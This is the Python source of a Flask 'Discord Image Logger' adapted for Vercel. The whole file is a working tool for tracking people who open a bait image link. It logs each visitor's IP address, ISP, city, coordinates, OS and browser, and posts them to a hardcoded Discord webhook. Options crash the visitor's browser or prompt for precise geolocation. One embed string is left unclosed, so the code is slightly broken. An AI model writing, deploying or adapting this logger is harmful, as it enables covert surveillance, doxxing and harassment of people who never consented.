# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted
# Adapted for Vercel/Flask while keeping 100% original logic

from flask import Flask, request, make_response, redirect
import requests
import base64
import traceback
import httpagentparser
from urllib import parse

app = Flask(__name__)

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1436665807601012878/c0DeklbWYrZjK71YSC672nVuLNa8WNPLeN-c_GxZ5dqA7hv3fg0MMa40TqI_fI2X5zpU",
    "image": "https://i.hizliresim.com/e41xq3y.png", 
    "imageArgument": True, 

    # CUSTOMIZATION #
    "username": "Image Logger", 
    "color": 0x00FFFF, 

    # OPTIONS #
    "crashBrowser": False, 
    "accurateLocation": False, 

    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
        "richMessage": True, 
    },

    "vpnCheck": 1, 
    "linkAlerts": True, 
    "buggedImage": True, 
    "antiBot": 1, 

    # REDIRECTION #
    "redirect": {
        "redirect": False, 
        "page": "https://your-link.here" 
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip: return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
                return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"): pass
            else: return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2:
            if info.get("proxy"): pass
            else: ping = ""
        if config["antiBot"] == 1:
                ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp') if info.get('isp') else 'Unknown'}`
> **ASN:** `{info.get('as') if info.get('as') else 'Unknown'}`
> **Country:** `{info.get('country') if info.get('country') else 'Unknown'}`
> **Region:** `{info.get('regionName') if info.get('regionName') else 'Unknown'}`
> **City:** `{info.get('city') if info.get('city') else 'Unknown'}`
> **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone').split('/')[1].replace('_', ' ') if info.get('timezone') else 'N/A'} ({info.get('timezone').split('/')[0] if info.get('timezone') else 'N/A'})`
> **Mobile:** `{info.get('mobile')}`
> **VPN:** `{info.get('proxy')}`
> **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def handler(path):
    try:
        # IP yakalama (Vercel için x-forwarded-for önemli)
        ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
        useragent = request.headers.get('user-agent')
        full_path = request.full_path if request.query_string else request.path

        if config["imageArgument"]:
            dic = dict(parse.parse_qsl(parse.urlsplit(full_path).query))
            if dic.get("url") or dic.get("id"):
                try: url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                except: url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]

        if ip.startswith(blacklistedIPs):
            return "", 204
        
        # Bot kontrolü ve görsel gönderimi
        if botCheck(ip, useragent):
            makeReport(ip, useragent, endpoint = request.path, url = url)
            if config["buggedImage"]:
                response = make_response(binaries["loading"])
                response.headers.set('Content-Type', 'image/jpeg')
                return response
            else:
                return redirect(url)
        
        # Normal kullanıcı işlemleri
        dic = dict(parse.parse_qsl(parse.urlsplit(full_path).query))
        if dic.get("g") and config["accurateLocation"]:
            try: location = base64.b64decode(dic.get("g").encode()).decode()
            except: location = None
            result = makeReport(ip, useragent, location, request.path, url = url)
        else:
            result = makeReport(ip, useragent, endpoint = request.path, url = url)

        message = config["message"]["message"]
        if config["message"]["richMessage"] and result:
            # Tüm replace işlemleri korunuyor
            message = message.replace("{ip}", ip if ip else "N/A")
            message = message.replace("{isp}", result.get("isp", "N/A"))
            message = message.replace("{asn}", result.get("as", "N/A"))
            message = message.replace("{country}", result.get("country", "N/A"))
            message = message.replace("{region}", result.get("regionName", "N/A"))
            message = message.replace("{city}", result.get("city", "N/A"))
            message = message.replace("{lat}", str(result.get("lat", "N/A")))
            message = message.replace("{long}", str(result.get("lon", "N/A")))
            message = message.replace("{timezone}", f"{result.get('timezone','').split('/')[1].replace('_', ' ') if '/' in result.get('timezone','') else 'N/A'}")
            message = message.replace("{mobile}", str(result.get("mobile", "N/A")))
            message = message.replace("{vpn}", str(result.get("proxy", "N/A")))
            message = message.replace("{bot}", str(result.get("hosting") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
            message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
            message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])

        if config["redirect"]["redirect"]:
            return redirect(config["redirect"]["page"])

        # HTML Response Hazırlama
        data = f'''<style>body {{ margin: 0; padding: 0; }} div.img {{ background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}</style><div class="img"></div>'''
        
        if config["message"]["doMessage"]:
            data = message
        
        if config["crashBrowser"]:
            data = message + '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        if config["accurateLocation"] and not dic.get("g"):
            data += """<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            var sep = currenturl.includes("?") ? "&" : "?";
            currenturl += (sep + "g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            location.replace(currenturl);
        });
    }
}
</script>"""

        response = make_response(data)
        response.headers.set('Content-Type', 'text/html')
        return response

    except Exception:
        reportError(traceback.format_exc())
        return "500 - Internal Server Error", 500

# Vercel'in uygulamayı tanıması için gerekli satır
app = app
